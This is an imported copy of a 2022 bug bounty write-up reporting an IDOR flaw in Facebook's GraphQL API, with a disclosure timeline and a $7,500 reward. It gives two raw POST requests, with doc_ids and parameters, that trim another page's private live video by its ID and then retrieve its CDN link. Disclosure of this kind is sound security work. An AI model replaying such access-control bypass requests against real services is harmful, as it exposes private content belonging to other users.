---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-02-15_trim-private-live-videos-and-access-them-meta-bug-bounty.md
original_filename: 2022-02-15_trim-private-live-videos-and-access-them-meta-bug-bounty.md
title: Trim private live videos and access them (Meta bug bounty)
category: documents
detected_topics:
- idor
- command-injection
- graphql
tags:
- imported
- documents
- idor
- command-injection
- graphql
language: en
raw_sha256: aeddf850686aef073a047f901926418edada489f82d93fb6e24576ea37ec4246
text_sha256: bce9ea4ef0d5621ffce27c101ce9c34d2bb1f10c5eeb25fe0c50c03ba3dc8856
ingested_at: '2026-06-28T07:32:10Z'
sensitivity: unknown
redactions_applied: false
---

# Trim private live videos and access them (Meta bug bounty)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-02-15_trim-private-live-videos-and-access-them-meta-bug-bounty.md
- Source Type: markdown
- Detected Topics: idor, command-injection, graphql
- Ingested At: 2026-06-28T07:32:10Z
- Redactions Applied: False
- Raw SHA256: `aeddf850686aef073a047f901926418edada489f82d93fb6e24576ea37ec4246`
- Text SHA256: `bce9ea4ef0d5621ffce27c101ce9c34d2bb1f10c5eeb25fe0c50c03ba3dc8856`


## Content

---
title: "Trim private live videos and access them (Meta bug bounty)"
url: "https://medium.com/@yaala/trim-private-live-videos-and-access-them-a331447cc82a"
authors: ["abdellah yaala (@yaalaab)"]
programs: ["Meta / Facebook"]
bugs: ["IDOR"]
bounty: "7,500"
publication_date: "2022-02-15"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2904
scraped_via: "browseros"
---

# Trim private live videos and access them (Meta bug bounty)

Trim private live videos and access them (Meta bug bounty)
abdellah yaala
Follow
Feb 15, 2022

184

Description : simple vulnerability allow an attacker to trim private live videos and access them.

Steps to reproduce: by known ID its possible to trim any private live video , using two graphql functions :

POST /api/graphql/ HTTP/2
Host: business.facebook.com

variables={“input”:{“client_mutation_id”:”1",”actor_id”:”[page_id]”,”video_id”:”[live_victim_video_id]”,”trimming_params”:{“trim_before_start”:0,”trim_after_end”:15}}}&doc_id=3859231820860792

Request above can trim 15 second for any private live video , and regenerate new video ID .

Get abdellah yaala’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

POST /api/graphql/ HTTP/2
Host: business.facebook.com

variables={“video_id”:”[new_video]”}&doc_id=3561288230642336

The second graphql can directly access to cdn link .

Press enter or click to view image in full size

Timeline :

November 20, 2021 : Report Sent

January 19, 2022 : bounty rewarded (7500$)
